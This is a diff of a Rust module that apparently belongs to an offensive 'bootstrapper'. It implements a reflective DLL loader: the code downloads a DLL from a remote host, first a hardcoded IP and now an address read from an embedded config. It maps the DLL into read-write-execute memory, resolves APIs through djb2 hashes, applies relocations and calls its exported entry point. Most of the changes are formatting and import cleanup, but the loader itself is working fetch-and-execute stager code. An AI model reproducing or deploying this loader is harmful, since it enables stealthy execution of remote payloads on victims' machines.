@@ -1,21 +1,23 @@
-use core::ffi::{c_char, c_void, CStr};
-use core::mem::{size_of, transmute};
-use core::ptr::{hash, null_mut};
 use alloc::collections::BTreeSet;
 use alloc::vec::Vec;
-use core::alloc::{GlobalAlloc};
+use core::alloc::GlobalAlloc;
+use core::ffi::{c_char, c_void, CStr};
+use core::mem::{size_of, transmute};
+use core::ptr::null_mut;
 use core::slice;
-use crate::core_link::bootstrapper::{types::{IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_FILE_HEADER, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, STATUS_SUCCESS}};
-use crate::core_link::bootstrapper::config::{DllDownloader, get_func_api};
-use crate::core_link::bootstrapper::Instance::{ALLOCATOR, get_instance};
-use crate::core_link::bootstrapper::utils::{hash_djb2, HASH_DLLMAIN, HASH_GET_PROC_ADDRESS, HASH_LOAD, HASH_LOAD_LIBRARY_A, HASH_NT_ALLOCATE_VIRTUAL_MEMORY, HASH_VIRTUAL_ALLOC, HASH_VIRTUAL_PROTECT};
-use super::bootstrapper::types::{GetProcAddressFn, LoadLibraryAFn, HMODULE, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_OPTIONAL_HEADER64, IMAGE_ORDINAL_FLAG64, IMAGE_THUNK_DATA64, VirtualProtectFn, PAGE_READWRITE, NtAllocateVirtualMemoryFn, HANDLE, VirtualAllocFn};
+
+use crate::core_link::bootstrapper::config::{DllDownloader, get_func_api, parse_toml};
+use crate::core_link::bootstrapper::Instance::get_instance;
+use crate::core_link::bootstrapper::types::{IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+use crate::core_link::bootstrapper::utils::{hash_djb2, HASH_DLLMAIN, HASH_LOAD, HASH_LOAD_LIBRARY_A, HASH_NT_ALLOCATE_VIRTUAL_MEMORY};
+
+use super::bootstrapper::types::{HANDLE, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_OPTIONAL_HEADER64, IMAGE_ORDINAL_FLAG64, IMAGE_THUNK_DATA64, LoadLibraryAFn, NtAllocateVirtualMemoryFn};
 
 pub fn copy_headers_and_sections(
     dll_base: *const u8,
     base_address: *mut u8,
     option_header: &IMAGE_OPTIONAL_HEADER64,
-    raw_nt_headers: *const IMAGE_NT_HEADERS
+    raw_nt_headers: *const IMAGE_NT_HEADERS,
 ) {
     unsafe {
         let size_of_headers = option_header.SizeOfHeaders as usize;
@@ -62,7 +64,7 @@ pub fn process_import_address_table(base_address: *mut u8, option_header: &IMAGE
                     let import_by_name = base_address.offset(*(*INT).u1.AddressOfData() as isize) as *const IMAGE_IMPORT_BY_NAME;
                     let func_name_ptr = (*import_by_name).Name.as_ptr();
                     let func_name_cstr = CStr::from_ptr(func_name_ptr).to_str().unwrap();
-                    let func_address = get_func_api(module_base as *const c_void,hash_djb2(func_name_cstr));
+                    let func_address = get_func_api(module_base as *const c_void, hash_djb2(func_name_cstr));
                     if !func_address.is_null() {
                         let iat_entry = IAT as *mut u64;
                         *iat_entry = func_address as u64;
@@ -128,16 +130,19 @@ pub fn apply_relocations(base_address: *mut u8, option_header: &IMAGE_OPTIONAL_H
 }
 
 pub fn load_dll() {
-    // const DLL_BYTES :&[u8] = include_bytes!("S:/Code/Rust/Dll/No_Std_MessageBox/target/release/no_std_messagebox.dll");
+    const CONFIG: &str = include_str!("../../profile.config");
+    let parsed_config = parse_toml(CONFIG);
+    let ip = parsed_config.ip.unwrap();
+    let path = parsed_config.path.unwrap();
     let mut downloader = DllDownloader {
         dll_data: Vec::new(),
     };
-    let DLL_BYTES = downloader.get_request_dll("14.103.51.167", "/no_std_messagebox.dll").unwrap();
+    let DLL_BYTES = downloader.get_request_dll(ip, path).unwrap();
     let dll_base = DLL_BYTES.as_ptr();
     let mut base_address: *mut c_void = null_mut();
     let raw_dos_header = dll_base as *const IMAGE_DOS_HEADER;
     let raw_nt_headers = unsafe { dll_base.offset((*raw_dos_header).e_lfanew as isize) } as *const IMAGE_NT_HEADERS;
-    let option_header = unsafe { (*raw_nt_headers).OptionalHeader};
+    let option_header = unsafe { (*raw_nt_headers).OptionalHeader };
     let mut region_size = unsafe { option_header.SizeOfImage as usize };
     let ins = get_instance();
     let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn = unsafe {
@@ -150,11 +155,11 @@ pub fn load_dll() {
             0,
             &mut region_size,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            PAGE_EXECUTE_READWRITE,
         )
     };
     copy_headers_and_sections(dll_base, base_address as *mut u8, &option_header, raw_nt_headers);
-    let loadlibrary_a:LoadLibraryAFn = unsafe { transmute(ins.win_api.funcs[&HASH_LOAD_LIBRARY_A]) };
+    let loadlibrary_a: LoadLibraryAFn = unsafe { transmute(ins.win_api.funcs[&HASH_LOAD_LIBRARY_A]) };
     process_import_address_table(base_address as *mut u8, &option_header, loadlibrary_a);
     apply_relocations(base_address as *mut u8, &option_header, region_size);
     unsafe {
@@ -171,14 +176,13 @@ pub fn load_dll() {
             let name_rva = *names_va.offset(i as isize);
             let name_va = base_address.offset(name_rva as isize) as *const i8;
             let func_name_cstr = CStr::from_ptr(name_va);
-            if  HASH_LOAD ==  hash_djb2(func_name_cstr.to_str().unwrap()) {
+            if HASH_LOAD == hash_djb2(func_name_cstr.to_str().unwrap()) {
                 let ordinal_index = *ordinals_va.offset(i as isize) as isize;
                 let func_rva = *addresses_va.offset(ordinal_index);
                 let func_va = base_address.offset(func_rva as isize);
                 let load: extern "C" fn() = core::mem::transmute(func_va);
                 load();
-            }
-            else if HASH_DLLMAIN == hash_djb2(func_name_cstr.to_str().unwrap()) {
+            } else if HASH_DLLMAIN == hash_djb2(func_name_cstr.to_str().unwrap()) {
                 let ordinal_index = *ordinals_va.offset(i as isize) as isize;
                 let func_rva = *addresses_va.offset(ordinal_index);
                 let func_va = base_address.offset(func_rva as isize);
@@ -194,7 +198,6 @@ pub fn load_dll() {
             }
         }
     }
-
 }
 
 
